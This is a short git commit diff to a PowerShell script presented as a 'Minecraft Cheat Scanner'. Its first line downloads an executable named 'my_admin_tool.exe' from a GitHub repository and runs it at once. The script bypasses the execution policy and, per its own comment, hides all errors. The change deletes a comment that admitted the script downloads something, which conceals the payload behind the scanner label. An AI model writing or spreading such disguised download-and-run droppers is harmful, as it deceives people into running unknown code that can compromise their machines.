44b21d07e54ca5488090966f3df4f92258c790db
Proshkaversus <fima17167@gmail.com>
2026-01-09 14:20:00 +0200

    Restore Minecraft Cheat Scanner functionality

--- cheker.ps1
+++ cheker.ps1
@@ -1,5 +1,5 @@
 Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
+# MINECRAFT CHEAT SCANNER v2.0 
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -95,6 +95,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
